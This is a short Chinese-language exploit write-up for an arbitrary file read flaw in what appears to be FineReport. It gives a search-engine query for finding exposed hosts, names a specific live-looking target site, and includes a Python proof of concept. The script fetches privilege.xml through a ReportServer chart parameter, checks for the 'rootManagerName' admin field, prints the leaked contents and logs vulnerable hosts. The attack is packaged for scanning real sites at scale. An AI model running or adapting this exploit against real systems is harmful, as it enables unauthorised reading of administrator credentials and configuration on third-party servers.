## 一、资产搜索

```
body="isSupportForgetPwd"
```

## 二、网站测试

```
http://frpt.ccig.com
```

## 三、验证漏洞

![image-20240906213636468](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240906213636468.png)

## 四、POC

```
payload = "/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
    try:
        res1 = requests.get(url=target,verify=False,timeout=5)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,verify=False,timeout=5)
            if "rootManagerName" in res2.text:
                with open("result.txt",'a',encoding='utf-8') as f:
                    f.write(f"该网站[+]{target}存在任意文件读取漏洞\n")
                print(f"该网站[+]{target}存在任意文件读取漏洞")
                print(res2.text)
            else:
                print(f"该网站[+]{target}不存在任意文件读取漏洞\n")
        else:
            print("访问超时，请手动测试！！！")
    except Exception as e:
        print(e)
```

## 五、测试结果

![image-20240906213234808](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240906213234808.png)

